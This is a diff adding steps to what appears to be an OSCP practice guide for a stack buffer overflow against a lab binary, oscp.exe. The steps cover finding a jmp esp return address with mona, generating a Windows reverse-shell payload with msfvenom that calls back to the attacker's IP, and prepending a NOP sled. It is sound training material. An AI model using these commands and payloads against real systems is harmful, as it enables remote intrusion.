@@ -119,5 +119,32 @@ Restart oscp.exe in Immunity and run the modified exploit.py script again. Repea
 
    <h4>Finding a Jump Point</h4>
    
+With the oscp.exe either running or in a crashed state, run the following mona command, making sure to update the -cpb option with all the badchars you identified (including \x00):
+
+    ✅ !mona jmp -r esp -cpb "\x00"
+
+This command finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified. The results should display in the "Log data" window (use the Window menu to switch to it if needed).
+
+Choose an address and update your exploit.py script, setting the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.
+
+   <h4>Generate Payload</h4>
+
+Run the following msfvenom command on Kali, using your Kali VPN IP as the LHOST and updating the -b option with all the badchars you identified (including \x00):
+
+
+    ✅ msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f py -v payload
+
+use -v, --var-name to Specify a custom variable name to use for certain output formats
+
+Copy the generated python code and integrate it into your exploit.py script, e.g. by setting the payload variable equal to the buf variable from the code.
+
+   <h4>Prepend NOPs</h4>
    
+Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:
+
+    ✅ padding = "\x90" * 16
+
+
+
+
 
